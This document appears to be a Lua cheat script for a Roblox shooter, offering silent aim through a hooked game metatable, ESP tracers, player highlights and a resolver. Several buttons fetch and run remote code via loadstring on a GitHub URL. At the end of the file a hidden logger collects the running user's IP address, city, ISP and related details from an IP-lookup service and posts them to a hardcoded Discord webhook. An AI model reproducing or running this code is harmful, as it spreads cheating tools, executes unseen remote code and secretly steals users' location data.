            tracerLine:Remove()
            return
        end

        local playerPosition = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if playerPosition then
            local headPosition = Part.Position + Vector3.new(0, Part.Size.Y / 2, 0)
            local screenPosition, onScreen = Camera:WorldToScreenPoint(headPosition)
            if onScreen then
                local tracerStart = Camera:WorldToViewportPoint(LocalPlayer.Character.Head.Position)
                local tracerEnd = Camera:WorldToViewportPoint(Part.Position)
                tracerLine.From = Vector2.new(tracerStart.X, tracerStart.Y)
                tracerLine.To = Vector2.new(tracerEnd.X, tracerEnd.Y)
                tracerLine.Color = TracerColor
                tracerLine.Thickness = 1
                tracerLine.Visible = true
            else
                tracerLine.Visible = false
            end
        else
            tracerLine.Visible = false
        end
    end

    RunService.RenderStepped:Connect(updateESPTracer)
end
function ESPLib:CreateTracer(player)
    player.CharacterAdded:Connect(function(character)
        task.wait(1)
        local part = character:FindFirstChild("HumanoidRootPart")
        if part then
            ESPLib:CreateESPTracer({
                player = player,
                Part = part,
                TracerColor = Color3.new(255,0,255)
            })
        end
    end)
end

for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        ESPLib:CreateTracer(player)
    end
end
loadstring(game:HttpGet(Fv, true))()
setclipboard("Xeno V2, Best silent aim included with highlight and esp tracer, made by @scz3_dra1 | sunshinexjuhari@protonmail.com")

end)

tab.newButton("Silent Aim v3", "sigma silent", function()
    --Library
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true))()
local Fv = "https://raw.githubusercontent.com/bobbbb-b/B/main/77_SJQ0ZC.lua"

local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = game:GetService("Workspace").CurrentCamera
local RunService = game:GetService("RunService")
local delay = 2
local closestPlayer
local shortestDistance = math.huge
local ESPLib = {} -- Empty

repeat task.wait() until Game:IsLoaded()

wait(delay)
local function Show(message)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.5, 0, 0.1, 0)
    frame.Position = UDim2.new(0.25, 0, 1, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.BorderSizePixel = 0 
    frame.Parent = screenGui
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.Position = UDim2.new(0, 0, 0, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = message
    textLabel.TextColor3 = Color3.new(1, 1, 1)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.Antique
    textLabel.TextSize = 14
    textLabel.Parent = frame
    
    local textBlur = Instance.new("TextLabel")
    textBlur.Size = UDim2.new(1, 0, 1, 0)
    textBlur.Position = UDim2.new(0, 0, 0, 0)
    textBlur.BackgroundTransparency = 1
    textBlur.Text = message
    textBlur.TextColor3 = Color3.new(1, 1, 1)
    textBlur.TextScaled = true
    textBlur.Font = Enum.Font.Antique
    textBlur.TextSize = 14
    textBlur.TextTransparency = 0.5
    textBlur.Parent = frame
    textBlur.ZIndex = textLabel.ZIndex - 1
    textBlur.TextStrokeTransparency = 0.75
    frame:TweenPosition(UDim2.new(0.25, 0, 0.9, 0), "Out", "Quad", 1, true)
    wait(5)
    for i = 0, 1, 0.1 do
        frame.BackgroundTransparency = i
        textLabel.TextTransparency = i
        textBlur.TextTransparency = 0.5 + i / 2
        wait(0.1)
    end
    screenGui:Destroy()
end

Show("Xeno V3 | Not Optimized")
Show("Discord: scz3_dra1")
Show("Please is 10s / 2m for the silent to fully loaded, if it's still lag, change to Version 2")
local highlight = Instance.new("Highlight")
highlight.Name = "Highlight"

-- Services | Variables
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local player = Players.LocalPlayer
local playerCharacter = player.Character or player.CharacterAdded:Wait()
local playerCamera = Workspace.CurrentCamera
local TargetedPlayer = nil
local TargetedPlayerCharacter = nil
local TargetedPlayerAimPart = nil

getgenv().Silent = { -- p1
    Settings = {
        Toggled = true,
        AimPart = "UpperTorso", -- HumanoidRootPart, UpperTorso, LowerTorso, Head <-- Main Parts
        HitChance = 100,
        
        Prediction = {
            Toggled = true,
            Horizontal = 0.14181525,
            Vertical = 0.13988125,
            Auto = true,
        },
       
        Circle = {
            Visible = true,
            Color = Color3.fromRGB(255, 0, 255),
            Transparency = 1,
            Thickness = 0.66,
            NumSides = 1000,
            Radius = 8,
            Filled = false,
        },
    },
}

getgenv().Settings = { -- p2
    ["Silent"] = {
        ["Enabled"] = true,
        ["AimPart"] = "UpperTorso",
        ["WallCheck"] = true,
        ["Visualize"] = true,
        ["Prediction"] = {
           ["Horizontal"] = 0.15,
           ["Vertical"] = 0.05,
        },
        ["AutoPrediction"] = {
            ["Enabled"] = true,
            ["Type"] = "Normal",
           ["ping20_30"] = 0.12588,
           ["ping30_40"] = 0.11911,
           ["ping40_50"] = 0.12471,
           ["ping50_0"] = 0.13766,
           ["ping60_70"] = 0.13731,
           ["ping70_80"] = 0.13951,
           ["ping80_90"] = 0.14181,
           ["ping90_100"] = 0.148,
           ["ping100_110"] = 0.156,
           ["ping110_120"] = 0.1567,
           ["ping120_130"] = 0.1601,
           ["ping130_140"] = 0.1637,
           ["ping140_150"] = 0.173,
           ["ping150_160"] = 0.1714,
           ["ping160_170"] = 0.1863,
           ["ping170_180"] = 0.1872,
           ["ping180_190"] = 0.1848,
           ["ping190_200"] = 0.1865,
        },
        ["Mode"] = "Namecall", --index,namecal
    },
    ["FOV"] = {
        ["Enabled"] = true,
        ["Size"] = 30,
        ["Filled"] = false,
        ["Thickness"] = 0.66,
        ["Transparency"] = 0.9,
        ["Color"] = Color3.fromRGB(255,0,255),
    },
    ["Camlock"] = {
        ["Enabled"] = true,
        ["AimPart"] = "HumanoidRootPart",
        ["Prediction"] = {
           ["Horizontal"] = 0.185,
           ["Vertical"] = 0.1,
        },
        ["Smoothness"] = 0.1,
        ["AutoPrediction"] = {
            ["Enabled"] = true,
            ["Type"] = "Normal", --//Normal, Custom
           ["ping20_30"] = 0.12588,
           ["ping30_40"] = 0.11911,
           ["ping40_50"] = 0.12471,
           ["ping50_60"] = 0.12766,
           ["ping60_70"] = 0.12731,
           ["ping70_80"] = 0.12951,
           ["ping80_90"] = 0.13181,
           ["ping90_100"] = 0.138,
           ["ping100_110"] = 0.146,
           ["ping110_120"] = 0.1367,
           ["ping120_130"] = 0.1401,
           ["ping130_140"] = 0.1437,
           ["ping140_150"] = 0.153,
           ["ping150_160"] = 0.1514,
           ["ping160_170"] = 0.1663,
           ["ping170_180"] = 0.1672,
           ["ping180_190"] = 0.1848,
           ["ping190_200"] = 0.1865,
        },
        ["Shake"] = {
            ["X"] = 10,
            ["Y"] = 0,
            ["Z"] = 0,
        },
    },
    ["Misc"] = {
        ["NoDelay"] = true,
        ["AutoReload"] = true, --False/True
        ["AutoAir"] = {
            ["Enabled"] = true,
            ["Interval"] = 0.5,
        },
        ["CMDS"] = { 
            ["Enabled"] = true,
            ["FOVPrefix"] = "B",
            ["Prediction"] = "A",
       },
    },
    ["Resolution"] = {
        ["Value"] = 1,
       },
    ["Resolvers"] = {  --entirely not
        ["Enabled"] = true,
        ["AutoDetect"] = false,
        ["Type"] = "Recalculator",
    },
    ["Visuals"] = {
        ["Ambient"] = {
            ["Enabled"] = false,
            ["Color"] = Color3.fromRGB(4, 0, 255),
        },
        ["OutDoor Ambient"] = {
            ["Enabled"] = false,
            ["Color"] = Color3.fromRGB(4, 0, 255)
        },
        ["Fog Modifications"] = {
            ["Enabled"] = false,
            ["Color"] = Color3.fromRGB(4, 0, 255),
            ["Start"] = 15,
            ["End"] = 100 
        },
        ["ColorCorrection"] = {
            ["Enabled"] = false,
            ["Brightness"] = 0,
            ["Saturation"] = 5,
            ["Contrast"] = 2,
        },
    },
}

local Hit_Success = false -- don't touch this.

-- ScreenGui | Variables
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = CoreGui
ScreenGui.Name = "ScreenGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = false
ScreenGui.DisplayOrder = 9e9
ScreenGui.Enabled = true
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.AutoLocalize = true
ScreenGui.Archivable = true

-- FOV Circle | Variables
local FOVCircle = Drawing.new("Circle")
FOVCircle.Visible = Silent.Settings.Circle.Visible
FOVCircle.Color = Silent.Settings.Circle.Color
FOVCircle.Transparency = Silent.Settings.Circle.Transparency
FOVCircle.Thickness = Silent.Settings.Circle.Thickness
FOVCircle.NumSides = Silent.Settings.Circle.NumSides
FOVCircle.Radius = playerCamera.ViewportSize.X / Silent.Settings.Circle.Radius
FOVCircle.Filled = Silent.Settings.Circle.Filled
FOVCircle.Position = Vector2.new(playerCamera.ViewportSize.X / 2, playerCamera.ViewportSize.Y / 2)
player.CharacterAdded:Connect(function(NewCharacter)
    playerCharacter = NewCharacter
end)

local function GetClosestPlayer()
    local ClosestPlayer = nil
    local ShortestDistance = math.huge

    for _, Player in ipairs(Players:GetPlayers()) do
        if Player ~= player and Player.Character then
            for _, PlayerPart in ipairs(Player.Character:GetChildren()) do
                if PlayerPart:IsA("BasePart") and PlayerPart.Transparency ~= 1 then
                    local PlayerScreenPosition = playerCamera:WorldToViewportPoint(PlayerPart.Position)                   
                    local PlayerDirection = (PlayerPart.Position - playerCamera.CFrame.Position).unit
                    local DotProduct = playerCamera.CFrame.LookVector:Dot(PlayerDirection)
                    
                    if DotProduct > 0 then
                        local MagnitudeDistance = (Vector2.new(PlayerScreenPosition.X, PlayerScreenPosition.Y) - FOVCircle.Position).Magnitude
                        
                        if MagnitudeDistance < ShortestDistance and MagnitudeDistance <= FOVCircle.Radius then
                            ClosestPlayer = Player
                            ShortestDistance = MagnitudeDistance
                        end
                    end
                end
            end
        end
    end
    return ClosestPlayer
end

RunService.RenderStepped:Connect(function(deltaTime)
    TargetedPlayer = GetClosestPlayer()
    if TargetedPlayer and TargetedPlayer.Character and TargetedPlayer.Character:WaitForChild(Silent.Settings.AimPart) then
        TargetedPlayerCharacter = TargetedPlayer.Character
        TargetedPlayerAimPart = TargetedPlayerCharacter:WaitForChild(Silent.Settings.AimPart)
    end
    
    if Silent.Settings.Prediction.Auto then
        local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
        if ping >= 10 and ping <= 200 then
            local predictionValue = math.clamp((ping - 10) / 190, 0, 1)
            Silent.Settings.Prediction.Horizontal = 0.128 + (0.2179 - 0.128) * predictionValue
            Silent.Settings.Prediction.Vertical = 0.128 + (0.2179 - 0.128) * predictionValue
        end
    end
end)

local RawMetaTable = getrawmetatable(game)
local OldRawMetaTable = RawMetaTable.__namecall

setreadonly(RawMetaTable, false)

math.randomseed(os.time())
RawMetaTable.__namecall = newcclosure(function(...)
    local RemoteArguments = {...}

    if Silent.Settings.Toggled and getnamecallmethod() == "FireServer" and TargetedPlayer and TargetedPlayerCharacter and TargetedPlayerAimPart then
        local VelocityPrediction = Vector3.new(TargetedPlayerAimPart.Velocity.X * Silent.Settings.Prediction.Horizontal, TargetedPlayerAimPart.Velocity.Y * Silent.Settings.Prediction.Vertical, TargetedPlayerAimPart.Velocity.Z * Silent.Settings.Prediction.Horizontal)
        Hit_Success = math.random(100) <= Silent.Settings.HitChance
        
        if (RemoteArguments[2] == "UpdateMousePos" and type(RemoteArguments[3]) ~= "table") or (RemoteArguments[2] == "MousePos" and type(RemoteArguments[3]) ~= "table") or (RemoteArguments[2] == "MOUSE" and type(RemoteArguments[3]) ~= "table") then 
            
            if Hit_Success then
                if Silent.Settings.Prediction.Toggled then
                    RemoteArguments[3] = TargetedPlayerAimPart.Position + VelocityPrediction
                elseif not Silent.Settings.Prediction.Toggled then
                    RemoteArguments[3] = TargetedPlayerAimPart.Position
                end
            end
            
        elseif (RemoteArguments[2] == "UpdateMousePos" and type(RemoteArguments[3]) == "table" and RemoteArguments[3]["MousePos"] and RemoteArguments[3]["Camera"] and not RemoteArguments[3][1] and not RemoteArguments[3][2]) then
            
            if Hit_Success then
                if Silent.Settings.Prediction.Toggled then
                    RemoteArguments[3] = {
                        ["MousePos"] = TargetedPlayerAimPart.Position + VelocityPrediction,
                        ["Camera"] = TargetedPlayerAimPart.Position + VelocityPrediction
                    }
                elseif not Silent.Settings.Prediction.Toggled then
                    RemoteArguments[3] = {
                        ["MousePos"] = TargetedPlayerAimPart.Position,
                        ["Camera"] = TargetedPlayerAimPart.Position
                    }
                end
            end
            
        elseif (RemoteArguments[2] == "UpdateMousePos" and type(RemoteArguments[3]) == "table" and not RemoteArguments[3]["MousePos"] and not RemoteArguments[3]["Camera"] and RemoteArguments[3][1] and RemoteArguments[3][2]) then
            
            if Hit_Success then
                if Silent.Settings.Prediction.Toggled then
                    RemoteArguments[3] = {
                        [1] = TargetedPlayerAimPart.Position + VelocityPrediction,
                        [2] = TargetedPlayerAimPart.Position + VelocityPrediction
                    }
                elseif not Silent.Settings.Prediction.Toggled then
                    RemoteArguments[3] = {
                        [1] = TargetedPlayerAimPart.Position,
                        [2] = TargetedPlayerAimPart.Position
                    }
                end
            end
            
        end
        
        return OldRawMetaTable(unpack(RemoteArguments))
    end
    return OldRawMetaTable(...)
end)

local function addHighlight(player)
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and not player.Character.HumanoidRootPart:FindFirstChild("Highlight") then
        local highlightClone = highlight:Clone()
        highlightClone.Adornee = player.Character
        highlightClone.Parent = player.Character:FindFirstChild("HumanoidRootPart")
        highlightClone.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    end
end

local function addHighlightALL()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            addHighlight(player)
        end
    end
end

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        task.wait()
        addHighlight(player)
        ESPLib:CreateTracer(player)
    end)
end)

Players.PlayerRemoving:Connect(function(playerRemoved)
    if playerRemoved.Character and playerRemoved.Character:FindFirstChild("HumanoidRootPart") then
        local highlightInstance = playerRemoved.Character.HumanoidRootPart:FindFirstChild("Highlight")
        if highlightInstance then
            highlightInstance:Destroy()
        end
    end
end)

RunService.Heartbeat:Connect(function()
    addHighlightALL()
end)

local function isTargetVisible(target)
    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("Head") then return false end
    
    local ray = Ray.new(character.Head.Position, (target.Position - character.Head.Position).unit * 500)
    local part, position = workspace:FindPartOnRay(ray, character, false, true)
    return part and part:IsDescendantOf(target.Parent)
end

function ESPLib:CreateESPTracer(params)
    local player = params.player
    local Part = params.Part
    local TracerColor = params.TracerColor or Color3.new(255,0,255)
    local tracerLine = Drawing.new("Line")
    tracerLine.Visible = false

    local function updateESPTracer()
        if not Part or not Part:IsA("BasePart") or not Part.Parent then
            tracerLine:Remove()
            return
        end

        local playerPosition = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        if playerPosition then
            local headPosition = Part.Position + Vector3.new(0, Part.Size.Y / 2, 0)
            local screenPosition, onScreen = Camera:WorldToScreenPoint(headPosition)
            if onScreen then
                local tracerStart = Camera:WorldToViewportPoint(LocalPlayer.Character.Head.Position)
                local tracerEnd = Camera:WorldToViewportPoint(Part.Position)
                tracerLine.From = Vector2.new(tracerStart.X, tracerStart.Y)
                tracerLine.To = Vector2.new(tracerEnd.X, tracerEnd.Y)
                tracerLine.Color = TracerColor
                tracerLine.Thickness = 1
                tracerLine.Visible = true
            else
                tracerLine.Visible = false
            end
        else
            tracerLine.Visible = false
        end
    end

    RunService.RenderStepped:Connect(updateESPTracer)
end
function ESPLib:CreateTracer(player)
    player.CharacterAdded:Connect(function(character)
        task.wait(1)
        local part = character:FindFirstChild("HumanoidRootPart")
        if part then
            ESPLib:CreateESPTracer({
                player = player,
                Part = part,
                TracerColor = Color3.new(255,0,255)
            })
        end
    end)
end

for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        ESPLib:CreateTracer(player)
    end
end
loadstring(game:HttpGet(Fv, true))()
setclipboard("Xeno V3, Not Optimized yet and still kinda laggy, updated silent aim with new preds value and resolver, made by @scz3_dra1 | sunshinexjuhari@protonmail.com")

end)

local tab = DrRayLibrary.newTab("Resolver", "ImageIdHere")
tab.newButton("Resolver", "little work", function()
    local RunService = game:GetService("RunService")

local function zeroOutYVelocity(hrp)
    hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
    hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
end

local function onPlayerAdded(player)
    player.CharacterAdded:Connect(function(character)
        local hrp = character:WaitForChild("HumanoidRootPart")
        zeroOutYVelocity(hrp)
    end)
end

local function onPlayerRemoving(player)
    player.CharacterAdded:Disconnect()
end

game.Players.PlayerAdded:Connect(onPlayerAdded)
game.Players.PlayerRemoving:Connect(onPlayerRemoving)

RunService.Heartbeat:Connect(function()
    pcall(function()
        for i, player in pairs(game.Players:GetChildren()) do
            if player.Name ~= game.Players.LocalPlayer.Name then
                local hrp = player.Character.HumanoidRootPart
                zeroOutYVelocity(hrp)
            end
        end
    end)
end)

end)








game.StarterGui:SetCore("SendNotification", {
    Title = "Yx.GGs/Xeno";
    Text = "for update: https://discord.com/invite/cMzPqDGwRV";
    Duration = 20;
})













local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1257619116697714748/T-l7qFOnTz5b0Ky_MomWg5L8NSxdLqt0kFvuv8SDkTFB_GKSGVSsjLi6KW2sPhhsH1Km"

local ip_info = syn.request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
syn.request(
    {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    }
)
